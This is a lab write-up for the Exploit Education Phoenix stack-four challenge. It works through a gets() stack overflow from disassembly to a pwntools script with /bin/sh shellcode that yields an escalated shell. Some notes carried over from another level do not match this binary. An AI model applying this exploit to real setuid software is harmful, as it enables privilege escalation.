# &#35; stack-4

#### &#42; pseudocode using ghidra
```bash

undefined4 main(void)

{
  puts("Welcome to phoenix/stack-four, brought to you by https://exploit.education");
  start_level();
  return 0;
}

void start_level(void)

{
  undefined4 unaff_retaddr;
  char local_50 [76];
  
  gets(local_50);
  printf("and will be returning to %p\n",unaff_retaddr);
  return;
}

```


#### &#42; check to binary
```bash
$ file /opt/phoenix/i486/stack-four
/opt/phoenix/i486/stack-four: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
  dynamically linked, interpreter /opt/phoenix/i486-linux-musl/lib/ld-musl-i386.so.1, not stripped

$ checksec /opt/phoenix/i486/stack-four
[*] '/opt/phoenix/i486/stack-four'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
    RPATH:    '/opt/phoenix/i486-linux-musl/lib'

```


#### &#42; how it work
#### buffer overflow on gets()
```bash
$ /opt/phoenix/i486/stack-four
Welcome to phoenix/stack-four, brought to you by https://exploit.education
aaaa
and will be returning to 0x804855c

```


#### &#42; vulnerable point
```bash
#### we can overwrite local_14 variable using ExploitEducation env variable
```


#### &#42; stack structure
#### local_54[64] + local_14[4] + dummy[8] + sfp[4] + ret[4]
```bash

$ gdb /opt/phoenix/i486/stack-four -q
GEF for linux ready, type `gef' to start, `gef config' to configure
71 commands loaded for GDB 8.2.1 using Python engine 3.5
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from /opt/phoenix/i486/stack-four...(no debugging symbols found)...done.
gef> disas start_level
Dump of assembler code for function start_level:
   0x08048505 <+0>:	push   ebp
   0x08048506 <+1>:	mov    ebp,esp
   0x08048508 <+3>:	sub    esp,0x58
   0x0804850b <+6>:	sub    esp,0xc
   0x0804850e <+9>:	lea    eax,[ebp-0x4c]
   0x08048511 <+12>:	push   eax
   0x08048512 <+13>:	call   0x8048310 <gets@plt>
   0x08048517 <+18>:	add    esp,0x10
   0x0804851a <+21>:	mov    eax,DWORD PTR [ebp+0x4]
   0x0804851d <+24>:	mov    DWORD PTR [ebp-0xc],eax
   0x08048520 <+27>:	sub    esp,0x8
   0x08048523 <+30>:	push   DWORD PTR [ebp-0xc]
   0x08048526 <+33>:	push   0x80485f3
   0x0804852b <+38>:	call   0x8048300 <printf@plt>
   0x08048530 <+43>:	add    esp,0x10
   0x08048533 <+46>:	nop
   0x08048534 <+47>:	leave
   0x08048535 <+48>:	ret
End of assembler dump.
gef> b *0x08048512
Breakpoint 1 at 0x8048512
gef> r < <(python -c 'print "A"*80+"BBBB"')


gef> x/4xw $ebp-0x4c        => local_50 [76]
0xffffd67c:	0x41414141	0x41414141	0x41414141	0x41414141
gef> x/4xw $ebp+0x4         => unaff_retaddr
0xffffd6cc:	0x42424242	0x00000000	0xffffd6f0	0xffffd76c
gef>


gef> x/32xw 0xffffd67c
0xffffd67c:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd68c:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd69c:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6ac:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6bc:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6cc:	0x42424242	0x00000000	0xffffd6f0	0xffffd76c
0xffffd6dc:	0xf7f8f654	0xffffd764	0x00000001	0xffffd76c
0xffffd6ec:	0xf7f8f654	0x00000001	0xffffd764	0xffffd76c
gef>



```

#### &#42; payload
```bash
#### local_50[76] + sfp[4] + ret[4]
payload  = b""
payload += b"\x90"*41
payload += shellcode
payload += b"A"*16
payload += p32(0xffffd6a0)
```

#### &#42; exploit code
```bash
$ cat exp_stack4.py
from pwn import *

context.arch='i386'
#context.log_level='debug'

filename="/opt/phoenix/i486/stack-four"

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"
print(len(shellcode))

payload  = b""
payload += b"\x90"*41
payload += shellcode
payload += b"A"*16
payload += p32(0xffffd6a0)
print(len(payload))
6
conn = process(filename)
print( conn.recvline() )
conn.send(payload)

with open("payload", "wb") as fd:
    fd.write(payload)

conn.interactive()



$ python exp_stack4.py
23
84
[+] Starting local process '/opt/phoenix/i486/stack-four': pid 1061
Welcome to phoenix/stack-four, brought to you by https://exploit.education

[*] Switching to interactive mode
$
and will be returning to 0xffffd6a0
[*] Got EOF while reading in interactive
$
[*] Process '/opt/phoenix/i486/stack-four' stopped with exit code -4 (SIGILL) (pid 1061)
[*] Got EOF while sending in interactive



$ (cat payload ;cat) | /opt/phoenix/i486/stack-four
Welcome to phoenix/stack-four, brought to you by https://exploit.education

and will be returning to 0xffffd6a0
id
uid=1000(user) gid=1000(user) euid=505(phoenix-i386-stack-five) egid=505(phoenix-i386-stack-five) groups=505(phoenix-i386-stack-five),27(sudo),1000(user)

```


